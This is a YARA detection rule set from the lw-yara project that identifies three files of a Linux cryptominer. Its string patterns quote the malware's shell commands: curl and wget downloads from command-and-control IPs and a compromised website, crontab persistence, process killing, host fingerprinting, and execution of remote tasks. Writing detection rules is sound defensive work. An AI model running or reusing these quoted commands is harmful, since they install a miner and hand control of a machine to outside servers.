/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: miner3
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_kon {
   meta:
      description = "miner3 - file kon"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "8e14e55e7c89bf67cf67d1f945c55fbbdc92bafbd4113f87c88336da76c7a01b"
   strings:
      $x1 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o templistge.txt http://37.72.175.148/npan/che.php?myip=$var2" fullword ascii
      $x2 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o config.json http://37.72.175.148/npan/command.php?myip=$var2" fullword ascii
      $x3 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o comm.php http://37.72.175.148/npan/comm.php?myip=$var2" fullword ascii
      $x4 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s5 = "curl -o prx http://pastebin.com/raw/i6uHVPMQ ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s6 = "var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s7 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var http://37.72.175.148/npan/bt.php?myip=$var2" fullword ascii
      $s8 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s9 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s10 = "echo \"*/4 * * * * pidof knox || exec $PWD/knox >/dev/null 2>&1 &\" | crontab -" fullword ascii
      $s11 = "chmod 0777 knox || wget http://migdalworld.org/wp-includes/images/media/mi/123/123/knox && chmod 0777 knox" fullword ascii
      $s12 = "var4=$(grep . namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(grep . pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s13 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s14 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s15 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s16 = "download.txt" fullword ascii
      $s17 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s18 = "var=$(grep . wprx) && var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl --socks5 $var -o $var4 $va" ascii
      $s19 = "var=$(grep . wprx) && var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl --socks5 $var -o $var4 $va" ascii
      $s20 = "var=$(grep . wprx) && var2=$(cat /etc/issue.net | sed 's/ /+/g' | cut -f 4) && var3=$(grep . mip) && curl --socks5 $var \"http:/" ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 40KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_09_30_18_cloki {
   meta:
      description = "miner3 - file cloki"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "3e7a3c01b4e7134909ec9ced955a82d77606e49d03ae0c25d666fad0b4d80f8f"
   strings:
      $x1 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s2 = "curl -o prx http://pastebin.com/raw/i6uHVPMQ ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s3 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s4 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s5 = "var4=$(cat namic.txt) && var5=$(cat link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s6 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s7 = "(cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum |cut -d\" \" -f1 > udic" fullword ascii
      $s8 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s9 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s10 = "rm link* namic* mip* comm* udic* pidi.txt" fullword ascii
      $s11 = "var4=$(cat namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(cat pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s12 = "var2=$(grep -Eio \"[^tasks(].*[^)]\" \"comm.php\") && $var2" fullword ascii
      $s13 = "download.txt" fullword ascii
      $s14 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s15 = "var4=$(cat namic.txt) && $PWD/$var4 > /dev/null > /dev/null &" fullword ascii
      $s16 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
      $s17 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
      $s18 = "0 -o comH" fullword ascii
      $s19 = "imnew.txt" fullword ascii
      $s20 = "ntastk.txt" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_09_30_18_byte {
   meta:
      description = "miner3 - file byte"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "ee72b7faaa2618860c96e90768ba8afd39757c4e0614732927b4fbd67a4283b9"
   strings:
      $x1 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s2 = "curl -o prx http://pastebin.com/raw/bzqUHJg9 ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s3 = "-o templistge.txt \"http://91.215.153.55/novys/che.php?suid=" fullword ascii
      $s4 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s5 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s6 = "-o config.json \"http://91.215.153.55/novys/command.php?suid=" fullword ascii
      $s7 = "var4=$(cat namic.txt) && var5=$(cat link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s8 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s9 = "-o comm.php \"http://91.215.153.55/novys/comm.php?suid=" fullword ascii
      $s10 = "(cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum |cut -d\" \" -f1 > udic" fullword ascii
      $s11 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s12 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s13 = "rm link* namic* mip* comm* udic* pidi.txt" fullword ascii
      $s14 = "|| wget http://migdalworld.org/wp-includes/images/media/mi/novys/" fullword ascii
      $s15 = "var4=$(cat namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(cat pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s16 = "var2=$(grep -Eio \"[^tasks(].*[^)]\" \"comm.php\") && $var2" fullword ascii
      $s17 = "download.txt" fullword ascii
      $s18 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s19 = "\"http://91.215.153.55/novys/bt.php?suid=" fullword ascii
      $s20 = "var4=$(cat namic.txt) && $PWD/$var4 > /dev/null > /dev/null &" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

